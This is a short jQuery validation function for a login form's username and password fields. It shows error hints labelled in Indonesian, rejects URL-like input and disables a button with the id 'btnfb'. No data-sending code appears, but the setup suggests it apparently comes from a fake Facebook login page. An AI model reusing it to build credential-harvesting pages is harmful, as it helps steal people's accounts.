function valid()
{
    var user = $('#user').val();
    var pass = $('#pass').val();
    if(user == '' || user == null)
    {
        $('.email').show();
        $('.sandi').hide();
        return false;
    }else{
    
        if(user.includes('@')){
        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
        if(user.match(pattern)){
        $('.email').hide();
        }else{
        $('.email').show();
        $('.sandi').hide();
        return false;
        }
        }
        
        if(!isNaN(user)){
        if(user.length <= 10){
        $('.email').show();
        $('.sandi').hide();
        return false;
        }else{
        $('.email').hide();
        }
        }
        
        if(user.match(/\s/g)){
        $('.email').show();
        $('.sandi').hide();
        return false;
        }else{
        $('.email').hide();
        }
        
        var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
        if(user.match(regex)){
        $('.email').show();
        $('.sandi').hide();
        return false;
        }
        
        
        if(user.length <= 5){
        $('.email').show();
        $('.sandi').hide();
        return false;
        }else{
        $('.email').hide();
        }
        
    }
    if(pass == '' || pass == null || pass.length <= 5)
    {
        $('.sandi').show();
        return false;
    }else{
        $('.sandi').hide();
    }
    var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
        if(pass.match(regexs)){
        $('.sandi').show();
        $('.email').hide();
        return false;
        }else{
        $('.sandi').hide();
        }
    
    // END EVENT
    $("#btnfb").addClass("disabled");
}